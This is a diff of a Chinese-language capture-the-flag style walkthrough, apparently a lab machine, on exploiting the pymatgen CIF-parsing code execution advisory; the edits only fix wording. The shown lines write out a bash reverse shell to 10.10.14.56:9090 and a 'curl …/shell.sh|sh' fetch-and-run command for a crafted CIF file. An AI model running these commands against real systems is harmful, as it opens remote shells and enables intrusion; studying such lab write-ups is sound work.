@@ -12,11 +12,11 @@
 ### 2.与使用 Python 库解析 CIF 文件相关的漏洞的 2024 CVE ID 是什么:
 #### 解析CIF文件时任意执行代码
 #### https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f
-#### 创建shell.sh文件,这样的9090是反弹shell的端口
+#### 创建shell.sh文件,这里的9090是反弹shell的端口
 ```
 [★]$ echo -ne '#!/bin/bash\n/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.56/9090 0>&1"' >shell.sh
 ```
-#### 修改为"curl http://10.10.14.56:8989/shell.sh|sh",这样的8989是上传文件的端口
+#### 修改为"curl http://10.10.14.56:8989/shell.sh|sh" ,这里的8989是上传文件的端口
 ```
 [★]$ vi syareya55.cif //看到官方文档的作者改自己名字，so...
 
